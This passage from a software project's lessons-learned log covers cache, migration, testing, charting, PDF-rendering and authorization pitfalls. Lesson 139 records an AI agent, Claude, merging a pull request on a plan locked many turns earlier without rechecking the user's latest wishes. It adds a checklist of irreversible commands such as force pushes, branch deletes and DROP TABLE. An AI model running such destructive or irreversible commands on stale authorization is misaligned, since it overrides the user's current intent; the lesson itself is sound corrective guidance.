Reusable for any future "we're collapsing two fields into one in v1
on the assumption they're always identical" decision. The pattern
is what lets v1 ship simply without locking out v2.

**Reference:** `risk-override.service.ts` (the guard) and
`risk-analysis-override-log.entity.ts` (the TSDoc on `previous_source`).

---

## 126. Post-Commit Cache Invalidation, Not Inside The Transaction

B.3's override service invalidates the resolver's cache for the
(org, category) pair AFTER the DB transaction commits, not inside
it. Inside-the-transaction invalidation creates an unbounded
staleness window: a concurrent reader between the cache-clear and
the commit hits the DB mid-transaction, sees old values, repopulates
the cache with stale data; the eventual commit doesn't re-invalidate.
After-commit invalidation bounds staleness to one in-flight read at
most (≤ cache TTL).

**Rule**: for analytics-layer caches (resolver L,I defaults, dashboard
aggregations, etc.), invalidate AFTER commit. The bounded staleness
window is acceptable. For correctness-critical caches (auth tokens,
permission checks), the same pattern is necessary but the staleness
window must be much smaller — consider a sub-second TTL or a
write-through cache instead.

**Reference:** `risk-override.service.ts` `applyOverride()` — the
`this.resolver.invalidate(...)` call runs OUTSIDE the
`dataSource.transaction()` block, with the rationale captured in
the inline comment.

---

## 127. Fire-And-Forget Enqueue With try/catch + logger.warn

B.3's override service enqueues a `learned-baseline` recompute job
to Bull after each commit. The enqueue is wrapped in try/catch with
`logger.warn` on failure — by the time the enqueue runs, the
override has already committed; a Redis hiccup must not retroactively
fail the user-facing 200 response.

Same pattern as A.1's `recordUnknownCategory` audit-log write and
B.2's reader audit-log write. The shape is: post-commit side effect
that the user doesn't directly need feedback on → fire-and-forget,
try/catch, warn on failure, return as if it succeeded.

**Rule**: every post-commit enqueue or audit-log write fires inside
its own try/catch with `logger.warn` on failure. If the operation
on the other side of the queue is mission-critical (it has to run
even on Redis outage), pick a different design — but for "degraded-
mode tolerable" side effects, this pattern keeps the user-facing
contract clean.

**Reference:** `risk-override.service.ts` (`baselineQueue.add` in
try/catch); same pattern in `document-processing.service.ts`
(`recordUnknownCategory`) and `risk-methodology-reader.service.ts`
(`recordMalformed`).

---

## 128. jest.fn(async () => …) Infers a Zero-Arg Tuple — Type It When Inspecting `.mock.calls`

B.4's processor spec failed to COMPILE (not a logic failure) on first
run: `mockBaselineRepo.upsert.mock.calls[0][1]` triggered TS2493
("Tuple type '[]' of length '0' has no element at index '1'").

Cause: `upsert: jest.fn(async () => ({ … }))` — the implementation
takes zero parameters, so TypeScript infers the mock's args tuple as
`[]`. Any `.mock.calls[N][argIndex]` access where argIndex >= 0 is
then out of bounds at the type level.

**Rule**: when a test needs to inspect a mock's call arguments via
`.mock.calls[N][argIndex]`, type the mock explicitly as
`jest.fn<ReturnType, [ArgA, ArgB, …]>()`. For B.4 the fix was
`jest.fn<Promise<any>, [any, any]>()` (TypeORM's `upsert(entity,
conflictOptions)` is two args). The same trap was hit earlier in A.1's
writer spec with the resolver mock — typing it `jest.fn<Promise<ResolveDefaultsResult>, [any]>()`
was the fix there too.

**Reference:** `learned-baseline.processor.spec.ts` (mockBaselineRepo.upsert),
`ai-risk-writer-integration.spec.ts` (mockResolver.resolveDefaults).

---

## 129. Phase 7.17 Prompt 1 — "Loop Closed" Milestone (Why The Resolver Chain Has 4 Steps)

B.4 completed the feedback loop that gives the risk-methodology
resolver its four-step chain instead of three. The full cycle:

```
OWNER_ADMIN override (B.3)
  → risk_analysis_override_log row
  → learned-baseline queue job
      → LearnedBaselineProcessor (B.4): count >= 10 → median of last 50
        → upsert risk_category_org_learned_baselines → invalidate cache
          → resolver tryStep2 (ORG_LEARNED) now returns the baseline
            → next AI finding in that (org, category) defaults to it
```

Step 2 (ORG_LEARNED) exists ONLY because of this loop — an org's
accumulated override behaviour becomes the default for its future
findings once it crosses the 10-override trust threshold. Without
B.3 + B.4, step 2 would be dead weight and the chain would
effectively be KB-ref → platform-default → fallback (three steps).

Recorded so a future reader doesn't see step 2 in the resolver and
wonder where its data comes from — it comes from the override loop,
not from any direct write path.

**Reference:** `risk-methodology-resolver.service.ts` (tryStep2),
`risk-override.service.ts` (the enqueue), `learned-baseline.processor.ts`
(the consumer). Phase 7.17 Prompt 1 plan, B.1 + B.3 + B.4 sections.

---

## 130. Pre-Implementation grep: "Was The Dependency Actually Wired Where The Plan Says?"

Before B.4 added `LearnedBaselineProcessor` (which consumes the
`learned-baseline` queue), the implementation grepped
`risk-analysis.module.ts` to confirm B.3's
`BullModule.registerQueue({ name: 'learned-baseline' })` had actually
landed there. A 5-second check that catches the "feature was in the
plan but landed in a different file / got reverted during a later
edit" class of bug — invisible until boot time when the @Processor
fails to find its queue.

Generalisation of Lesson #124: when phase N depends on infrastructure
that phase N-1 was supposed to register, grep-confirm it's where the
plan claims before building on top of it. Cheap insurance against
cross-phase drift.

**Reference:** B.4 pre-implementation check against
`risk-analysis.module.ts:48`.

---

## 131. Edge-Case Walkthroughs Catch Schema Drift; Happy-Path-Only Plans Don't

B.5's deleted-user code path exposed a live `user_id` NOT NULL / FK
NO-ACTION schema drift on `risk_analysis_override_log` — a drift that
was invisible from both the migration file (corrected on disk) and the
entity (declared nullable). It surfaced ONLY because the B.5 plan
thought through the explanation endpoint's "what do we render when
`user_id` is NULL (deleted user)?" path → "wait, CAN it be NULL?" →
check live `\d` + `pg_constraint` → no, it's NOT NULL on already-migrated
environments.

A plan that only described the success case (finding exists, user
exists, history renders) would never have asked the question and the
drift would have shipped, silently blocking user-deletion for anyone
with override history.

**Generalisation:** when planning a feature, walk at least one
explicit failure/edge path (null FK, deleted parent, empty set,
concurrent write). The questions those paths force are where latent
schema and data-integrity bugs live. Same root cause as the silent-enum
drift in lessons #31 / #109.

**Reference:** Phase 7.17 Prompt 1, B.5 plan — "Discovered issue:
user_id schema drift"; corrective migration
`1748000000011-FixOverrideLogUserIdNullable.ts`.

---

## 132. localhost ≠ Docker Postgres — Verify Which DB A Migration Hits

This machine runs TWO Postgres servers: a host-native instance bound to
`127.0.0.1:5432` (loopback) and the `sign-postgres` container bound to
`*:5432`. `localhost` resolves to loopback, so a host-CLI
`migration:run` against `@localhost:5432/sign_db` hit the **host-native**
DB — NOT the dockerized `sign_db` the app actually uses. The tell was
migration 004 (long since applied to the real DB) **re-running** during
the B.5 migration run.

The catch came from cross-checking the run's output against the
container's truth: `docker port sign-postgres` (confirms the mapping)
plus `docker exec sign-postgres psql ... "SELECT count(*) FROM
migrations"` vs. what the CLI run reported. The counts disagreed → two
databases.

**Rule:** before trusting any host-CLI migration run, sanity-check the
migration count or most-recently-applied migration name against the
container's truth (`docker exec ... psql`). The canonical safe path is
to run migrations INSIDE the container —
`docker exec sign-backend npm run typeorm -- migration:run -d
src/config/data-source.ts` — so `postgres` resolves via the Docker
network to the real DB. A migration running silently against the wrong
DB is one of the worst bug classes: it "succeeds," writes nothing useful
to the DB you care about, and is visible only as "why is migration 004
re-running?"

**Reference:** Phase 7.17 Prompt 1, B.5 migration verification.

---

## 133. State-Aware Corrective Migrations: Prove BOTH Branches Before Merging

A corrective migration has two branches: the **fix** (drifted env → fix
it) and the **no-op** (correct env → skip). In practice production may
only ever exercise the no-op branch — which means the fix branch ships
as completely untested code to whatever drifted environments exist out
there. That is exactly the code you most need to be sure of.

Pattern (used to prove `1748000000011`'s fix branch when no real DB was
actually drifted):

```
BEGIN;
  -- induce the exact drift the migration fixes
  ALTER TABLE ... SET NOT NULL;  ALTER TABLE ... ADD CONSTRAINT ... NO ACTION;
  SELECT 'DRIFTED', <state>;        -- → t / a
  -- run the migration's exact up() DO-blocks
  <corrective DO $$ ... $$ blocks>
  SELECT 'FIXED', <state>;          -- → f / n
ROLLBACK;                           -- discard everything; real schema untouched
```

DRIFTED → FIXED proves the fix branch; ROLLBACK guarantees zero
collateral on the shared dev DB. The no-op branch is proven separately
by running the real migration against the already-correct DB and
confirming the state is unchanged + the re-run reports "No migrations
are pending."

**Rule:** apply this to every state-aware corrective migration going
forward — induce-fix-verify-rollback for the fix branch, run-on-correct
for the no-op branch. Both branches proven, no DB left mutated.

**Reference:** Phase 7.17 Prompt 1, B.5 migration verification;
`1748000000011-FixOverrideLogUserIdNullable.ts`.

## 134. EXPLAIN ANALYZE On An Empty/Near-Empty Table Proves Nothing About Index Selection At Scale

The Phase 7.17 Prompt 2a worst-finding query
(`MAX(risk_score) GROUP BY project` in
`PortfolioAnalyticsService.getProjectRisk`) was EXPLAIN-ANALYZEd on the dev
DB — which had **0 rows** in `risk_analyses`. The plan showed clean index
scans, but that result is **worthless** for the question it was meant to
answer: at 0 rows the planner's cost estimates are degenerate (every access
path "wins" by a rounding margin), so it cannot tell you whether the
aggregation / heap-fetch path holds at 10k or 1M rows. Worse, the empty
plan only exercised the `contract_id` join path — NOT the `MAX(risk_score)`
aggregation cost the verification existed to scrutinise.

**Decision recorded correctly:** keep "no index" — but as a *default*, not
as "verified". The justification is workload shape (`risk_analyses` is
write-hot; the worst-finding query is an infrequent OWNER_ADMIN read), so a
covering index would trade guaranteed write-amplification for a speculative
read win. NOT because an empty-DB EXPLAIN "passed".

**Rule:** any index decision that depends on data volume MUST be verified
against representative row counts (seeded / staging), never dev's empty
tables. If you can only EXPLAIN against an empty table, record the result as
*inconclusive* and defer with an explicit staging re-check plus the named
fix to apply iff the bottleneck materialises (here:
`CREATE INDEX … (contract_id) INCLUDE (risk_score)`).

Extends #132 (localhost ≠ Docker Postgres — verify which DB a migration
hits) and the verification-discipline thread (#131, #133): the environment
your verification runs against decides whether the verification means
anything at all.

**Reference:** Phase 7.17 Prompt 2a, Addition 1;
`PortfolioAnalyticsService.getProjectRisk`.

## 135. A Green Suite On The Empty Dev DB Proves No-Crash, Not Numerical Correctness

The dev DB is empty/near-empty (2 contracts, 0 risk_analyses). That means
**data-dependent correctness cannot be verified locally** — aggregation
VALUES (does `MAX(risk_score) GROUP BY project` return the right number?),
index selection (does the planner pick the right path at scale?), and
null-population behavior (what does a widget render when every
`contract_value` is NULL, which is the real post-migration state?) are all
invisible to a local test run.

A green suite on this DB proves two things and only two things:
1. **no crash** — the code paths execute without throwing, and
2. **logic-unit correctness** — pure functions (bucket folds, pairing
   rules, pctChange) compute the right answer for hand-fed inputs.

It does NOT prove the numbers are right against real data, because there is
no real data to aggregate.

**Rule:** any aggregation, index, or null-handling decision that depends on
data volume or distribution is **GATED on staging re-verification against
representative data** — it is NOT closed by local green. Mark such items
explicitly as staging-gated in the code/notes rather than letting a passing
local suite imply they're done.

#134 is the EXPLAIN-specific instance of this principle; this is the general
form. cf. #132 (verify which DB you're hitting).

**Reference:** Phase 7.17 Prompt 2a verification; dev DB row counts at
implementation time (2 contracts, 0 risk_analyses).

## 136. Portfolio Chart.js Charts Set `animation: false` (Interrupted Grow-Animation Under React Re-render Leaves Charts Mid-State)

**Mechanism (the condition, not the symptom):** recreating a Chart.js chart
(`destroy()` + `new Chart()`, which is what a React effect does on config change)
while a grow animation is *in flight* can leave the chart stuck mid-animation. A
**reversed value axis** (`scales.x.reverse`, used so RTL horizontal bars grow from
the right) makes the breakage *egregious and obvious* — bars render as stubs at
the wrong end — but the reversed axis is the **exposing symptom, not the cause**.
The cause is interrupted animation, so the constraint applies to **ALL portfolio
charts, not just reversed-axis ones**. (Do not re-enable animation on a
non-reversed widget citing "it's only the bar" — that's the trap.)

**Not a version bug, not a static-config bug.** Clean vanilla isolation (single
creation, no React, ground-truth pixels after settle) renders the reversed RTL bar
correctly in all four combos {4.4.0, 4.5.0} × {animation on, off}. The 4.5.0 bump
was unnecessary and was reverted — the app keeps one Chart.js version (4.4.0).

**Reachability — dev-StrictMode artifact, NOT a confirmed production bug.**
Verified with the real `ChartBlock`, 4.4.0, animation:TRUE, no StrictMode: a
**single** chart-recreating re-render (a production period/filter/locale change)
settles **correctly**, whether the change lands *after* the initial animation or
*during* it (interrupting it). The stuck state required the *rapid, repeated*
recreation of dev StrictMode's synchronous double-mount (compounded by a
mount-time `i18n.changeLanguage`), which the real page does not do (stable
`useMemo` config; language set at app init; single creation). So `animation:false`
is **not fixing a production bug** — it is a harmless, prudent dashboard default
that (a) removes the dev-StrictMode broken-looking render and (b) guards against
any future change that could make recreations rapid in prod. Keep it on every
portfolio chart; do not claim it's prod-load-bearing.

**Method rule (the deeper lesson):** when a fix touches multiple variables
(version, resize, animation), isolate **one variable at a time against the
settled state via ground-truth pixels** — never attribute to whichever variable
happened to be off in the test that "worked." Every early "working" test here used
`animation:false`, so animation was never actually isolated until forced to; and
`getChart` reads were unreliable mid-recreate, so only pixels could be trusted.

**Reference:** Phase 7.17 Prompt 2b Step 1; `ChartBlock.tsx` (`withRtlChrome`,
`animation:false`); throwaway iso-bar + rerender-test harnesses (since removed).

## 137. Latin Numerals For Monetary AND Count Values Even Under AR Locale (MENA Construction-Finance Convention)

**Rule:** in the portfolio dashboard (and by extension, any contract-finance
surface in the SIGN app), monetary amounts AND plain count values render with
**Latin (0-9) numerals**, ISO currency codes, and ISO date strings — **even
under the Arabic (rtl) locale**. Do NOT reach for
`Intl.NumberFormat('ar-EG', ...)` (or similar locale-aware numeric formatting)
on financial figures. Monetary: `Intl.NumberFormat('en-US', { minimumFractionDigits: 2,
maximumFractionDigits: 2 }).format(value) + ' ' + isoCode` →
`"100,000,000.00 EGP"`. Plain counts: `Intl.NumberFormat('en-US').format(n)` →
`"12"`. Dates from the backend (`YYYY-MM`) are rendered verbatim.

**Why:** MENA construction-finance practice (FIDIC / NEC contracts, AED/EGP/SAR
financial reporting, project ledgers) consistently uses Latin numerals for
monetary values regardless of the document's language. Arabic-Indic numerals
(٠-٩) in a contract-value figure are unusual in this domain and read as a
confusion source — exactly the kind of subtle "localization win" that
back-fires in production review meetings. ISO currency codes (EGP, USD, AED)
are universally readable and avoid the "ج.م.‏" / "$" / Arabic-currency-name
sprawl. The decision is deliberate and survives locale.

**Anti-pattern to refuse:** "the user is in AR locale, so the contract value
should use Arabic-Indic numerals — that's what `Intl.NumberFormat('ar-EG')`
gives me." Refuse the refactor. The next person localizing a number will
reflexively reintroduce locale-aware numeric formatting on these surfaces; this
lesson is the durable guard.

**Scope:** applies to the portfolio dashboard's value-per-currency rows, KPI
counts, top-projects table figures, and any future contract-value display on
the page. Does NOT apply to non-financial UI numerics (e.g. notification
counts in the topbar) — there, locale-aware formatting is fine.

**Reference:** Phase 7.17 Prompt 2b Bucket 1 (D4); `KpiCard.tsx`,
`value-per-currency` rendering.

## 138. `nest start --watch` Can Silently Stop Hot-Restarting Across An Edit Cascade — Verify The Route Is In The Last Boot's `RouterExplorer` Log Before Debugging The Code

Under rapid sequential edits across many files (a refactor cascade — new module
+ new controller + new service + entity + DTO all touched in one session),
NestJS dev mode (`nest start --watch`) can fall behind and **stop reloading**
the running process — leaving a stale Nest snapshot on the network while the
source on disk has moved on.

**Symptom:** a route present in CURRENT source AND in CURRENT compiled `dist/`
returns **404** when hit. The frontend (Vite HMR) is serving the latest code
that calls the new route; the backend is the stale process and 404s. The
inconsistency reads as "the new route is broken" until you check the backend
log.

**Tell:** grep the backend log for
`RouterExplorer.Mapped {/api/v1/<your-route>, GET}`. If the line is **missing
from the most recent Nest boot's startup section**, the watcher never reloaded
after the route was added. The `dist/` having the right code is not enough —
RouterExplorer only registers routes during the bootstrap phase, which only
re-runs on a successful watch restart.

**Diagnosis sequence (the one that worked, Phase 7.17 Prompt 2b live triage):**
1. `curl -s -o /dev/null -w "%{http_code}\n" http://localhost:3000/api/v1/<route>`
   → 404
2. `docker logs sign-backend | grep "<route>"` → no `RouterExplorer.Mapped` line
   for it
3. `docker logs sign-backend | tail -50` → last boot was hours ago, before the
   route was added
4. `docker restart sign-backend` → fresh boot, RouterExplorer maps the new
   route, curl now 401 (auth-gated, registered)

**Fix:** `docker restart sign-backend` — a full process restart, NOT a watcher
poke. Watcher restart attempts often re-fail in this state; only a clean
process boot reliably picks up the cascade.

**Don't do:** assume the route is broken in source. `tsc --noEmit` shows zero
errors; the source is fine; `dist/` has the compiled file. The bug is in the
process state, not the code state. Editing the source to "fix" a stale-process
404 introduces a real bug into known-good code.

**Rule:** when a route returns 404 despite current source + current dist,
confirm `RouterExplorer.Mapped` for it is in the most recent boot log **before**
opening the editor. If absent, `docker restart sign-backend` first, re-curl,
**then** decide if there is a code bug.

This is the dev-loop analogue of #132 (verify which DB you're hitting) and #134
(verify the environment your verification ran against) — the *process state*
your code runs under decides whether the result means anything.

**Reference:** Phase 7.17 Prompt 2b live triangulation; `/app/portfolio`
returning ErrorState despite source-clean typecheck + `PortfolioAnalyticsController`
present in source and dist; resolved by `docker restart sign-backend`
(route 404 → 401).

## 139. Irreversible Actions Re-Confirm The Latest User Instruction At The Moment Of Execution — A Plan Locked Earlier Is Not Authorization For The Trigger

A long autonomous run can drift. The plan you locked five turns ago is not the
same authorization as "act on the user's latest preference." For any action
that **cannot be cleanly undone** — merge to main, force push, branch delete,
destructive DB op, payment, public post, production deploy — re-read the
user's **most recent** message immediately before executing. Not the locked
plan; the last instruction.

**The specific instance (Phase 7.17 Prompt 2b merge).** Early in the run the
user offered "squash or fast-forward, your call but tell me which" for the
PR #38 merge style. Claude chose rebase-merge, reported it as matching the 2a
precedent, and the conversation moved on through CI watch + Monitor work +
live DevTools triangulation across many turns. At merge time the locked
rebase-merge plan ran straight through to `gh pr merge --rebase` without
re-reading the user's latest message to confirm the deferred decision still
held. The user surfaced a preference for squash post-merge (to keep two
debugging-arc commits — the Chart.js revert + the #136 attribution
correction — off main's permanent history). The merge stands because
rewriting pushed main is more harmful than the cosmetic gain, but the
*process* failed regardless of whether a squash instruction was ever explicit
in a later turn. The failure mode is precisely "deferred decision executed
without re-confirmation against the latest message," not "Claude dropped a
later instruction."

**Anti-pattern to refuse:** "I told them the plan N turns ago and they didn't
object — I'll just execute." That is **not** the same as: "I'm about to do
the irreversible thing right now; let me re-read their last message to be
sure nothing has shifted." The former is what failed here. The latter is the
rule.

**Rule — Pre-MERGE / Pre-IRREVERSIBLE checklist.** For these actions
specifically:
- `gh pr merge` (any flag) / `gh pr close`
- `git push --force*` to any branch
- `git push origin main` when bypassing PR
- `git branch -D`, `git tag -d`, `git push --delete`
- `gh release create`, `gh release delete`
- Any payment endpoint call (Paymob, Stripe)
- `DROP TABLE` / `TRUNCATE` / `DELETE` without a tight `WHERE`
- Any production deploy

Before pulling the trigger, **re-read the user's most recent message in the
conversation**. If the most recent instruction differs from the locked plan,
surface the discrepancy and **ASK**; do not silently follow the older plan.
This is in addition to (not a replacement for) the existing Pre-PR Checklist.

**Compose with:** the existing Pre-PR Checklist (CLAUDE.md → Team Coordination
Rules). That checklist runs *before opening* a PR. This rule runs *before
merging* it — and before any other irreversible action that may have been
decided several turns earlier.

This is the autonomy-discipline analogue of #131 / #133 / #134 (verify the
environment your verification ran against). For an irreversible action, the
*instruction* you act under matters at least as much as the *code* you run.

**Reference:** Phase 7.17 Prompt 2b — PR #38 merged via rebase-merge after a
merge-style decision locked many turns earlier; user's preferred style
(squash) surfaced post-merge. Merge intentionally not reverted; the lesson is
the corrective.

## 140. Mocking The External-Library Render/Call Path Hides Total Failure Of That Path — #135 Applied To Renderers

When a service wraps an external library (pdfmake, ffmpeg, sharp, xlsx,
puppeteer, etc.) and the RISK of the service is the library call itself —
its API contract, its version compatibility, its config requirements — unit
tests that mock the wrapper hide total failure of that path. The mock returns
a happy Buffer; the real call throws on the first production invocation.

**The specific instance (Phase 7.17 Prompt 2c renderer bug).**
`PortfolioExportProcessor`'s unit tests mocked the renderer:

```typescript
rendererRender: jest.fn().mockResolvedValue(Buffer.from('pdf-bytes'))
```

Correct for processor-level invariants (status transitions, file cleanup,
failure email dispatch). But it left the actual pdfmake call path entirely
unexercised. The first end-to-end live trigger surfaced
`TypeError: PdfPrinter is not a constructor` — pdfmake@0.3.7's main export is
an INSTANCE, not a class; the v0.1.x `require('pdfmake')` pattern returns
`{ virtualfs, urlAccessPolicy }` and calling `new` on it throws. **49 unit
tests passed clean over a wrapper that could not generate a single byte of
PDF.**

**Why the unit tests couldn't have caught it.** The processor mock returned a
Buffer because that's what the contract advertises. The contract is right;
the implementation is broken. Mock vs. real are indistinguishable to the
processor's tests — that's the design of the mock.

**Rule.** Any service whose RISK includes the external library call itself
MUST have at least one NO-MOCK integration test that exercises the real
library against representative-shape data. The test asserts real properties
of real output (PDF: `%PDF` magic + `%%EOF` marker; image: width/height/
format; video: container + codec; spreadsheet: opens in xlsx parser). One
test is enough — its presence proves the library path is exercised; its
absence guarantees you're testing the mock, not the wrapper.

**What "representative-shape data" means.** Data that matches what production
callers actually feed the wrapper. Sparse-and-empty for the dev DB (empty
arrays, null fields, zero counts) — exactly the shape that catches "the
renderer crashes on the null/empty case the mocks didn't feed it." NOT
carefully-curated fixtures designed to make the happy path render.

**This is #135 applied to renderers.** #135 says "a green local suite proves
no-crash + logic-unit correctness, NOT that the values are right at scale."
This lesson says: when the value/byte/file IS the library's output, no-crash
on real data is itself a separate verification gate — and mocking the library
can never produce that gate.

**Reference:** Phase 7.17 Prompt 2c renderer fix; commit `d4dc54a`;
`portfolio-export-renderer.service.spec.ts` (3 no-mock integration tests
covering sparse / null / empty docDef shapes).

## 141. SIGN Has No Global JWT Guard — Token-Gated Endpoints Inherit The Bare-HTTP Threat Model

A search for `useGlobalGuards(JwtAuthGuard)` or `{ provide: APP_GUARD, useClass:
JwtAuthGuard }` returns ZERO matches in the SIGN backend. JWT auth is opt-in
per controller via `@UseGuards(JwtAuthGuard)` on the class or per method.
There is also no `@Public()` decorator defined anywhere — it does not need
one because there is nothing to opt OUT of.

**Implications.** Any endpoint without `@UseGuards(JwtAuthGuard)` is bare
HTTP. Existing examples:

- `ComplianceReportDownloadController` (compliance download, token-gated)
- `PortfolioExportDownloadController` (Phase 7.17 Prompt 2c, token-gated)

For each, the verification chain IS the entire auth gate. There is no JWT
layer behind it.

**When you add a new token-gated public endpoint (rare, do carefully):**
1. Do NOT use `@Public()` — it does not exist.
2. Simply omit `@UseGuards(JwtAuthGuard)`. That IS the opt-out.
3. The HMAC secret env var IS the entire security floor. Joi-require it at
   startup with `.min(32).required()` — refuse to boot below the floor.
4. Constant-time HMAC compare (`crypto.timingSafeEqual`) MUST run BEFORE any
   DB lookup. If the DB read ever moves ahead of the signature check,
   Postgres becomes the unauthenticated attack surface under forged-token
   spray. Make this a tested invariant (see the no-DB-on-HMAC-fail regression
   test in `portfolio-export-token.service.spec.ts`).
5. Audit-log every outcome — success AND each failure reason — with distinct
   event types so leaked-URL probes are visible in admin/security forensics.
   HTTP responses should collapse all failure reasons to two codes (401 /
   410) so an attacker can't enumerate which check failed; the audit row
   captures the truth.
6. Wrap the audit-record call in a caller-side try/catch (the docusign
   convention). An audit-log hiccup must NEVER turn a valid 200 into a 500.

**This is the threat-model side of #138** (verify the route is in the latest
boot's RouterExplorer log) — both lessons take seriously that the FRAMEWORK
assumption you make about your endpoint's protection is the one that bites at
production scale.

**Reference:** Phase 7.17 Prompt 2c §3 #11 plan-review verification;
`backend/src/main.ts` + `backend/src/app.module.ts` (no APP_GUARD
registration); `ComplianceReportDownloadController` (line 114, no
`@UseGuards`); `PortfolioExportDownloadController` (Phase 7.17 Prompt 2c
Bucket 3).

## 142. Compliance + Export PDF Services Use The Same Broken pdfmake v0.1 Require Pattern — KNOWN-BROKEN Production State, HIGH PRIORITY FIX

> **STATUS UPDATE (2026-06-22, PR #92):** The **export half is FIXED**.
> `export.service.ts` now renders via the pdfmake 0.3.x pattern
> (`require('pdfmake/js/Printer').default` + `require('pdfmake/js/URLResolver').default`
> + `new URLResolver(null)` + `await printer.createPdfKitDocument(...)`) in its
> now-async `createPdfBuffer()` method (formerly the broken `toBuffer()`), with a
> no-mock `%PDF` integration test — mirroring the 2c renderer fix `d4dc54a`.
> **Only `compliance/services/pdf-report.service.ts` remains broken** — that fix is
> its own separate small PR. The historical record of the bug (both services) is
> preserved below unchanged.

**State of the bug.** The following two services use the
`require('pdfmake')` + `new PdfPrinter(...)` pattern from pdfmake v0.1.x.
The installed version is `pdfmake@0.3.7` where the main export is an
INSTANCE, not a class. Both services WILL throw
`TypeError: PdfPrinter is not a constructor` the moment they are triggered
end-to-end:

- `backend/src/modules/compliance/services/pdf-report.service.ts` — `toBuffer()`
  at line ~542. The shipped compliance-report flow (Phase 3.4:
  COMPLIANCE_SUMMARY / OBLIGATIONS_REPORT / JURISDICTION_CONFLICT) goes
  through this method.
- `backend/src/modules/export/export.service.ts` — **FIXED (PR #92).** The render
  method is now the async `createPdfBuffer()` (formerly `toBuffer()`), rebuilt on
  the pdfmake 0.3.x pattern. The shipped contract-PDF export goes through this
  method, which now works end-to-end.

Both features are SHIPPED but have evidently never been triggered end-to-end
at runtime in dev (otherwise this same `TypeError` would have surfaced when
a user requested a compliance report or exported a contract PDF). They are
**latent-broken in production**.

**How this was discovered.** Phase 7.17 Prompt 2c (portfolio export PDF)
mirrored the compliance precedent verbatim. The first end-to-end live
trigger crashed with the constructor error. The investigation traced the
bug to a pdfmake major-version change between when the original
`pdf-report.service.ts` was written and the current `0.3.7` installation.

**Mechanically-identical fix** (proven for the 2c renderer in commit
`d4dc54a`). Apply to BOTH services:

```typescript
// OLD (broken on pdfmake@0.3.x):
const PdfPrinter = require('pdfmake');
const printer = new PdfPrinter({ Helvetica: {...} });
const pdfDoc = printer.createPdfKitDocument(docDef, options);
// pdfDoc.on('data', ...) — broken; pdfDoc is now a Promise

// NEW (works on pdfmake@0.3.7):
const PdfPrinter = require('pdfmake/js/Printer').default;
const URLResolver = require('pdfmake/js/URLResolver').default;
const printer = new PdfPrinter(
  { Helvetica: {...} },
  undefined,
  new URLResolver(null),
);
const pdfDoc = await printer.createPdfKitDocument(docDef, options);
// now pdfDoc is the pdfkit doc — stream listeners work as before
```

Plus add a no-mock renderer integration test PER service that asserts a real
PDF buffer (`%PDF` magic + `%%EOF` marker) — the #140 application.

**Effort.** ~30 minutes per service plus the integration test. Each gets its
OWN small PR — do NOT bundle into a feature PR.

**Severity.** HIGH. Compliance PDF reporting is a customer-facing shipped
feature. The same applies to `ExportService`'s contract-PDF endpoint. Both
currently fail the moment they're invoked.

**Don't file this as housekeeping.** This is a production-breaking known
state, recorded prominently in CLAUDE.md → "Critical Known Bugs". The fix is
small AND urgent — schedule it as the next small-PR after Phase 7.17 closes.

**Reference:** Phase 7.17 Prompt 2c renderer fix commit `d4dc54a`; the
user-mandated trimmed pipeline check that surfaced the bug; lesson #140
(mock vs. real for external-library wrappers).

---

### Lesson #143 — TypeORM Auto-Appends `_enum` Suffix to PostgreSQL Enum Type Names

**Encountered:** Phase 7.25, migration `1751000000005-AddHumanReviewQualityFlags.ts`

**What happened.** The migration ran `ALTER TYPE document_processing_status ADD VALUE IF NOT EXISTS 'HUMAN_REVIEW_RECOMMENDED'` and failed with:

```
error: type "document_processing_status" does not exist
```

The fix was changing the target to `document_processing_status_enum`.

**Root cause.** TypeORM auto-generates the PostgreSQL enum type name by taking the column
name in `snake_case` and appending `_enum`. So a TypeScript `@Column({ type: 'enum', enum: DocumentProcessingStatus })`
on a column called `processing_status` produces a PostgreSQL type named
`document_processing_status_enum` — NOT the bare TypeScript enum name
`DocumentProcessingStatus` or its snake-cased form `document_processing_status`.

**The pattern:**
- TypeScript enum name: `DocumentProcessingStatus`
- Column name (snake_case): `processing_status`
- PostgreSQL type name: `document_processing_status_enum` ← this is what `ALTER TYPE` must target

**The rule.** Before writing any `ALTER TYPE` migration on a TypeORM-managed enum, verify the
actual PostgreSQL type name with:

```sql
SELECT typname FROM pg_type WHERE typname LIKE '%processing_status%';
-- Returns: document_processing_status_enum
```

Or from inside a running container:
```bash
docker exec sign-postgres psql -U sign_user -d sign_db \
  -c "SELECT typname FROM pg_type WHERE typname LIKE '%status%';"
```

**Hard rule.** `ALTER TYPE <bare_enum_name> ADD VALUE` is always wrong for TypeORM-managed
enums. Always use `ALTER TYPE <snake_case_column_name>_enum ADD VALUE IF NOT EXISTS`.
The `IF NOT EXISTS` keeps the migration idempotent across fresh and existing databases.

**Reference:** Phase 7.25 migration fix; contrast with Phase 7.3 lesson #109 where the
wrong enum NAME (`obligations_status_enum` vs `obligation_status`) was the bug — here the
wrong SUFFIX (missing `_enum`) was the bug. Both are the same class: ALTER TYPE fails
silently when the target name is wrong unless you remove the error-swallowing `EXCEPTION WHEN`
anti-pattern (lessons #31, #103).

---

### Lesson #144 — Always Audit ALL Locales When an i18n Task Names One Specific Language

**Encountered:** Phase 7.26, i18n completion audit.

**What happened.** The task was titled "French i18n Completion" — auditing whether French
was complete. Full investigation of all three locale files revealed:
- FR was already structurally complete (all EN keys present)
- EN itself was missing `language.fr` — the key the LanguageToggle reads to label the
  French option in an English session
- AR was missing 12 keys across 4 sections (`portal`, `userType`, 4 `nav` keys, `language.fr`)

A task scoped to "French" would have naturally focused only on `fr/common.json`. The real
bugs were in EN and AR.

**The pattern.** i18n gaps are rarely isolated to the locale the task mentions. Adding a
feature (e.g. Phase 7.25 scan quality) requires adding keys to all three locales at once.
When a locale audit is ordered for one language, ALL locales need reading:
1. The named locale may already be correct
2. The reference locale (EN) may be missing keys (e.g. `language.fr`)
3. Other locales may have gaps that context reveals

**Hard rule.** When a task touches any locale file, or when an audit names one locale,
read all three locale files before drawing any conclusions. The audit target may be the
least-broken of the three.

**Corollary — adding a new locale option (e.g. Spanish):**
1. Add the language key to ALL existing locale files in the same commit
2. Register in `LanguageToggle.tsx`
3. Add the new locale file itself
All three changes go in one commit — a partial add leaves the switcher label broken
in all locales that are missing the new key.

**Reference:** Phase 7.26 Track A investigation; lesson #83 (silent `undefined` from
missing Vite env vars is the same class — missing config in one place silently breaks
a different place).

---

### Lesson #145 — A Missing @RequirePermission Decorator Silently Disables Authorization — "There Is A Guard Stack" Does NOT Mean "The Route Is Authorized"

`GET /api/v1/contracts/:id` had `@UseGuards(JwtAuthGuard, RolesGuard,
